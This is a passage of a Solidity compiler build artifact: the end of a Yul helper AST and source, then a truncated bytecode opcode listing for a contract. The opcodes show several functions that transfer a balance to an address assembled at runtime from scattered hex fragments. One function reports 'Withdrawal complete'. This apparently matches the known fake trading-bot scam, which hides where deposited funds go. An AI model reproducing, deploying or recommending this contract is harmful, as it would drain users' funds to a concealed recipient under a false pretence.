															"nodeType": "YulIf",
															"src": "3573:35:10"
														},
														{
															"nodeType": "YulAssignment",
															"src": "3618:14:10",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "3627:1:10"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "3630:1:10"
																	}
																],
																"functionName": {
																	"name": "div",
																	"nodeType": "YulIdentifier",
																	"src": "3623:3:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "3623:9:10"
															},
															"variableNames": [
																{
																	"name": "r",
																	"nodeType": "YulIdentifier",
																	"src": "3618:1:10"
																}
															]
														}
													]
												},
												"name": "checked_div_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "3484:1:10",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "3487:1:10",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "r",
														"nodeType": "YulTypedName",
														"src": "3493:1:10",
														"type": ""
													}
												],
												"src": "3453:185:10"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "3672:152:10",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3689:1:10",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3692:77:10",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "3682:6:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "3682:88:10"
															},
															"nodeType": "YulExpressionStatement",
															"src": "3682:88:10"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3786:1:10",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3789:4:10",
																		"type": "",
																		"value": "0x41"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "3779:6:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "3779:15:10"
															},
															"nodeType": "YulExpressionStatement",
															"src": "3779:15:10"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3810:1:10",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "3813:4:10",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "3803:6:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "3803:15:10"
															},
															"nodeType": "YulExpressionStatement",
															"src": "3803:15:10"
														}
													]
												},
												"name": "panic_error_0x41",
												"nodeType": "YulFunctionDefinition",
												"src": "3644:180:10"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "3864:142:10",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "3874:25:10",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "3897:1:10"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "3879:17:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "3879:20:10"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "3874:1:10"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "3908:25:10",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "3931:1:10"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "3913:17:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "3913:20:10"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "3908:1:10"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "3955:22:10",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x12",
																				"nodeType": "YulIdentifier",
																				"src": "3957:16:10"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "3957:18:10"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "3957:18:10"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "3952:1:10"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "3945:6:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "3945:9:10"
															},
															"nodeType": "YulIf",
															"src": "3942:35:10"
														},
														{
															"nodeType": "YulAssignment",
															"src": "3986:14:10",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "3995:1:10"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "3998:1:10"
																	}
																],
																"functionName": {
																	"name": "mod",
																	"nodeType": "YulIdentifier",
																	"src": "3991:3:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "3991:9:10"
															},
															"variableNames": [
																{
																	"name": "r",
																	"nodeType": "YulIdentifier",
																	"src": "3986:1:10"
																}
															]
														}
													]
												},
												"name": "mod_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "3853:1:10",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "3856:1:10",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "r",
														"nodeType": "YulTypedName",
														"src": "3862:1:10",
														"type": ""
													}
												],
												"src": "3830:176:10"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "4057:149:10",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "4067:25:10",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "4090:1:10"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "4072:17:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "4072:20:10"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "4067:1:10"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "4101:25:10",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "4124:1:10"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "4106:17:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "4106:20:10"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "4101:1:10"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "4135:17:10",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "4147:1:10"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "4150:1:10"
																	}
																],
																"functionName": {
																	"name": "sub",
																	"nodeType": "YulIdentifier",
																	"src": "4143:3:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "4143:9:10"
															},
															"variableNames": [
																{
																	"name": "diff",
																	"nodeType": "YulIdentifier",
																	"src": "4135:4:10"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "4177:22:10",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nodeType": "YulIdentifier",
																				"src": "4179:16:10"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "4179:18:10"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "4179:18:10"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "diff",
																		"nodeType": "YulIdentifier",
																		"src": "4168:4:10"
																	},
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "4174:1:10"
																	}
																],
																"functionName": {
																	"name": "gt",
																	"nodeType": "YulIdentifier",
																	"src": "4165:2:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "4165:11:10"
															},
															"nodeType": "YulIf",
															"src": "4162:37:10"
														}
													]
												},
												"name": "checked_sub_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "4043:1:10",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "4046:1:10",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "diff",
														"nodeType": "YulTypedName",
														"src": "4052:4:10",
														"type": ""
													}
												],
												"src": "4012:194:10"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "4255:43:10",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "4265:27:10",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "4280:5:10"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "4287:4:10",
																		"type": "",
																		"value": "0xff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "4276:3:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "4276:16:10"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "4265:7:10"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint8",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "4237:5:10",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "4247:7:10",
														"type": ""
													}
												],
												"src": "4212:86:10"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "4346:146:10",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "4356:23:10",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "4377:1:10"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint8",
																	"nodeType": "YulIdentifier",
																	"src": "4361:15:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "4361:18:10"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "4356:1:10"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "4388:23:10",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "4409:1:10"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint8",
																	"nodeType": "YulIdentifier",
																	"src": "4393:15:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "4393:18:10"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "4388:1:10"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "4420:16:10",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "4431:1:10"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "4434:1:10"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "4427:3:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "4427:9:10"
															},
															"variableNames": [
																{
																	"name": "sum",
																	"nodeType": "YulIdentifier",
																	"src": "4420:3:10"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "4463:22:10",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nodeType": "YulIdentifier",
																				"src": "4465:16:10"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "4465:18:10"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "4465:18:10"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "sum",
																		"nodeType": "YulIdentifier",
																		"src": "4452:3:10"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "4457:4:10",
																		"type": "",
																		"value": "0xff"
																	}
																],
																"functionName": {
																	"name": "gt",
																	"nodeType": "YulIdentifier",
																	"src": "4449:2:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "4449:13:10"
															},
															"nodeType": "YulIf",
															"src": "4446:39:10"
														}
													]
												},
												"name": "checked_add_t_uint8",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "4333:1:10",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "4336:1:10",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "sum",
														"nodeType": "YulTypedName",
														"src": "4342:3:10",
														"type": ""
													}
												],
												"src": "4304:188:10"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "4541:148:10",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "4551:23:10",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "4572:1:10"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint8",
																	"nodeType": "YulIdentifier",
																	"src": "4556:15:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "4556:18:10"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "4551:1:10"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "4583:23:10",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "4604:1:10"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint8",
																	"nodeType": "YulIdentifier",
																	"src": "4588:15:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "4588:18:10"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "4583:1:10"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "4615:17:10",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "4627:1:10"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "4630:1:10"
																	}
																],
																"functionName": {
																	"name": "sub",
																	"nodeType": "YulIdentifier",
																	"src": "4623:3:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "4623:9:10"
															},
															"variableNames": [
																{
																	"name": "diff",
																	"nodeType": "YulIdentifier",
																	"src": "4615:4:10"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "4660:22:10",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nodeType": "YulIdentifier",
																				"src": "4662:16:10"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "4662:18:10"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "4662:18:10"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "diff",
																		"nodeType": "YulIdentifier",
																		"src": "4648:4:10"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "4654:4:10",
																		"type": "",
																		"value": "0xff"
																	}
																],
																"functionName": {
																	"name": "gt",
																	"nodeType": "YulIdentifier",
																	"src": "4645:2:10"
																},
																"nodeType": "YulFunctionCall",
																"src": "4645:14:10"
															},
															"nodeType": "YulIf",
															"src": "4642:40:10"
														}
													]
												},
												"name": "checked_sub_t_uint8",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "4527:1:10",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "4530:1:10",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "diff",
														"nodeType": "YulTypedName",
														"src": "4536:4:10",
														"type": ""
													}
												],
												"src": "4498:191:10"
											}
										]
									},
									"contents": "{\n\n    function array_length_t_string_memory_ptr(value) -> length {\n\n        length := mload(value)\n\n    }\n\n    function array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, length) -> updated_pos {\n        mstore(pos, length)\n        updated_pos := add(pos, 0x20)\n    }\n\n    function copy_memory_to_memory_with_cleanup(src, dst, length) {\n        let i := 0\n        for { } lt(i, length) { i := add(i, 32) }\n        {\n            mstore(add(dst, i), mload(add(src, i)))\n        }\n        mstore(add(dst, length), 0)\n    }\n\n    function round_up_to_mul_of_32(value) -> result {\n        result := and(add(value, 31), not(31))\n    }\n\n    function abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_fromStack(value, pos) -> end {\n        let length := array_length_t_string_memory_ptr(value)\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, length)\n        copy_memory_to_memory_with_cleanup(add(value, 0x20), pos, length)\n        end := add(pos, round_up_to_mul_of_32(length))\n    }\n\n    function abi_encode_tuple_t_string_memory_ptr__to_t_string_memory_ptr__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_fromStack(value0,  tail)\n\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function panic_error_0x11() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x11)\n        revert(0, 0x24)\n    }\n\n    function checked_mul_t_uint160(x, y) -> product {\n        x := cleanup_t_uint160(x)\n        y := cleanup_t_uint160(y)\n        let product_raw := mul(x, y)\n        product := cleanup_t_uint160(product_raw)\n\n        // overflow, if x != 0 and y != product/x\n        if iszero(\n            or(\n                iszero(x),\n                eq(y, div(product, x))\n            )\n        ) { panic_error_0x11() }\n\n    }\n\n    function panic_error_0x32() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x32)\n        revert(0, 0x24)\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function checked_add_t_uint256(x, y) -> sum {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        sum := add(x, y)\n\n        if gt(x, sum) { panic_error_0x11() }\n\n    }\n\n    function checked_sub_t_uint160(x, y) -> diff {\n        x := cleanup_t_uint160(x)\n        y := cleanup_t_uint160(y)\n        diff := sub(x, y)\n\n        if gt(diff, 0xffffffffffffffffffffffffffffffffffffffff) { panic_error_0x11() }\n\n    }\n\n    function checked_add_t_uint160(x, y) -> sum {\n        x := cleanup_t_uint160(x)\n        y := cleanup_t_uint160(y)\n        sum := add(x, y)\n\n        if gt(sum, 0xffffffffffffffffffffffffffffffffffffffff) { panic_error_0x11() }\n\n    }\n\n    function increment_t_uint256(value) -> ret {\n        value := cleanup_t_uint256(value)\n        if eq(value, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) { panic_error_0x11() }\n        ret := add(value, 1)\n    }\n\n    function panic_error_0x12() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x12)\n        revert(0, 0x24)\n    }\n\n    function checked_div_t_uint256(x, y) -> r {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        if iszero(y) { panic_error_0x12() }\n\n        r := div(x, y)\n    }\n\n    function panic_error_0x41() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x41)\n        revert(0, 0x24)\n    }\n\n    function mod_t_uint256(x, y) -> r {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        if iszero(y) { panic_error_0x12() }\n        r := mod(x, y)\n    }\n\n    function checked_sub_t_uint256(x, y) -> diff {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        diff := sub(x, y)\n\n        if gt(diff, x) { panic_error_0x11() }\n\n    }\n\n    function cleanup_t_uint8(value) -> cleaned {\n        cleaned := and(value, 0xff)\n    }\n\n    function checked_add_t_uint8(x, y) -> sum {\n        x := cleanup_t_uint8(x)\n        y := cleanup_t_uint8(y)\n        sum := add(x, y)\n\n        if gt(sum, 0xff) { panic_error_0x11() }\n\n    }\n\n    function checked_sub_t_uint8(x, y) -> diff {\n        x := cleanup_t_uint8(x)\n        y := cleanup_t_uint8(y)\n        diff := sub(x, y)\n\n        if gt(diff, 0xff) { panic_error_0x11() }\n\n    }\n\n}\n",
									"id": 10,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x42 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1B55BA3A EQ PUSH2 0x4D JUMPI DUP1 PUSH4 0x70E44C6A EQ PUSH2 0x57 JUMPI DUP1 PUSH4 0xBEDF0F4A EQ PUSH2 0x75 JUMPI DUP1 PUSH4 0xD82C52D6 EQ PUSH2 0x7F JUMPI PUSH2 0x49 JUMP JUMPDEST CALLDATASIZE PUSH2 0x49 JUMPI STOP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x55 PUSH2 0xA9 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x5F PUSH2 0x10F JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x6C SWAP2 SWAP1 PUSH2 0xC07 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x7D PUSH2 0x1B0 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x8A JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH2 0x93 PUSH2 0x216 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xA0 SWAP2 SWAP1 PUSH2 0xC07 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH0 PUSH2 0xBA PUSH2 0xB5 PUSH2 0x236 JUMP JUMPDEST PUSH2 0x3A6 JUMP JUMPDEST SWAP1 POP PUSH0 DUP2 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH2 0xE2 PUSH2 0x671 JUMP JUMPDEST SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x10A JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x60 PUSH0 PUSH2 0x122 PUSH2 0x11D PUSH2 0x236 JUMP JUMPDEST PUSH2 0x3A6 JUMP JUMPDEST SWAP1 POP PUSH0 DUP2 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH2 0x14A PUSH2 0x671 JUMP JUMPDEST SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x172 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x13 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x5769746864726177616C20636F6D706C65746500000000000000000000000000 DUP2 MSTORE POP SWAP3 POP POP POP SWAP1 JUMP JUMPDEST PUSH0 PUSH2 0x1C1 PUSH2 0x1BC PUSH2 0x236 JUMP JUMPDEST PUSH2 0x3A6 JUMP JUMPDEST SWAP1 POP PUSH0 DUP2 SWAP1 POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH2 0x8FC PUSH2 0x1E9 PUSH2 0x671 JUMP JUMPDEST SWAP1 DUP2 ISZERO MUL SWAP1 PUSH1 0x40 MLOAD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP9 CALL SWAP4 POP POP POP POP ISZERO DUP1 ISZERO PUSH2 0x211 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x40 MLOAD DUP1 PUSH1 0xA0 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x7E DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0xF54 PUSH1 0x7E SWAP2 CODECOPY SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x60 PUSH0 PUSH2 0x287 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x7800000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH2 0x282 PUSH2 0x27D PUSH2 0x678 JUMP JUMPDEST PUSH2 0x682 JUMP JUMPDEST PUSH2 0x90C JUMP JUMPDEST SWAP1 POP PUSH0 PUSH3 0xD6FBC SWAP1 POP PUSH0 PUSH2 0x299 PUSH2 0xA9E JUMP JUMPDEST SWAP1 POP PUSH0 PUSH3 0xE8433 SWAP1 POP PUSH0 PUSH2 0x2AB PUSH2 0xAA8 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x2485 SWAP1 POP PUSH0 PUSH2 0x2BC PUSH2 0xAB2 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH3 0xBF315 SWAP1 POP PUSH0 PUSH2 0x2D8 DUP10 PUSH2 0x2D3 DUP11 PUSH2 0x682 JUMP JUMPDEST PUSH2 0x90C JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x2F5 PUSH2 0x2E7 DUP10 PUSH2 0x682 JUMP JUMPDEST PUSH2 0x2F0 DUP10 PUSH2 0x682 JUMP JUMPDEST PUSH2 0x90C JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x312 PUSH2 0x304 DUP9 PUSH2 0x682 JUMP JUMPDEST PUSH2 0x30D DUP9 PUSH2 0x682 JUMP JUMPDEST PUSH2 0x90C JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x32F PUSH2 0x321 DUP8 PUSH2 0x682 JUMP JUMPDEST PUSH2 0x32A DUP8 PUSH2 0x682 JUMP JUMPDEST PUSH2 0x90C JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x34E PUSH2 0x33F DUP7 DUP7 PUSH2 0x90C JUMP JUMPDEST PUSH2 0x349 DUP6 DUP6 PUSH2 0x90C JUMP JUMPDEST PUSH2 0x90C JUMP JUMPDEST SWAP1 POP PUSH0 PUSH2 0x390 PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x1 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x3000000000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP DUP4 PUSH2 0x90C JUMP JUMPDEST SWAP1 POP DUP1 SWAP15 POP POP POP POP POP POP POP POP POP POP POP POP POP POP POP SWAP1 JUMP JUMPDEST PUSH0 DUP1 DUP3 SWAP1 POP PUSH0 DUP1 DUP1 PUSH0 PUSH1 0x2 SWAP1 POP JUMPDEST PUSH1 0x2A DUP2 LT ISZERO PUSH2 0x664 JUMPI PUSH2 0x100 DUP5 PUSH2 0x3CB SWAP2 SWAP1 PUSH2 0xC73 JUMP JUMPDEST SWAP4 POP DUP5 DUP2 DUP2 MLOAD DUP2 LT PUSH2 0x3E0 JUMPI PUSH2 0x3DF PUSH2 0xCB4 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP3 POP DUP5 PUSH1 0x1 DUP3 PUSH2 0x401 SWAP2 SWAP1 PUSH2 0xCEA JUMP JUMPDEST DUP2 MLOAD DUP2 LT PUSH2 0x412 JUMPI PUSH2 0x411 PUSH2 0xCB4 JUMP JUMPDEST JUMPDEST PUSH1 0x20 ADD ADD MLOAD PUSH1 0xF8 SHR PUSH1 0xF8 SHL PUSH1 0xF8 SHR PUSH1 0xFF AND SWAP2 POP PUSH1 0x61 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND LT ISZERO DUP1 ISZERO PUSH2 0x463 JUMPI POP PUSH1 0x66 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND GT ISZERO JUMPDEST ISZERO PUSH2 0x47C JUMPI PUSH1 0x57 DUP4 PUSH2 0x475 SWAP2 SWAP1 PUSH2 0xD1D JUMP JUMPDEST SWAP3 POP PUSH2 0x528 JUMP JUMPDEST PUSH1 0x41 DUP4 PUSH20 